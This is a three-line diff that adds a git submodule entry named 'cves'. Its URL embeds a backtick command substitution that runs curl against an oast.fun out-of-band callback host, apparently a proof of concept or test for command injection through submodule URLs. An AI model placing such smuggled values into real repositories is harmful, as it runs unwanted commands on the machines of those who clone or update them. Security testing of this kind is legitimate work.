@@ -1,0 +1,3 @@
+[submodule "cves"]
+	path = cves
+	url = ssh://`curl epvgcpxzhotpzaixxcvhsf64nebr6vib1.oast.fun`foo.example.com/bar
